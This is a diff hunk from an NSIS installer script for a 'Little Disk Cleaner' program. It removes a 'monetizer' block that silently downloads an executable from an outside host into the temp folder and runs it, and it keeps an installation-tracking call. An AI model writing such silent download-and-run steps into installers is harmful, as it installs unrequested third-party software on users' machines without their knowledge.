@@ -179,12 +179,6 @@ Section "Little Disk Cleaner (required)" SecMain
   NsisLittleSoftwareStats::TrackInstallation "http://stats.yourwebsite.com/api.xml" "xml" "f64e57760e1b49e93c1a1165a905575f" "${VERSION}"
   Pop $0
  
-  ; Install Monetizer
-  ${If} $install_LittleAppSuggestor != 1
-      inetc::get /SILENT "http://www.cooctdlfast.com/download.php?lnqBcg==" "$TEMP\InstallManager.exe" /end
-      ExecWait "$TEMP\InstallManager.exe"
-  ${EndIf}
- 
   ; Start system restore point
   DetailPrint "$(DESC_StartSysRestore)"
   SysRestore::StartRestorePoint /NOUNLOAD "Installed Little Disk Cleaner"
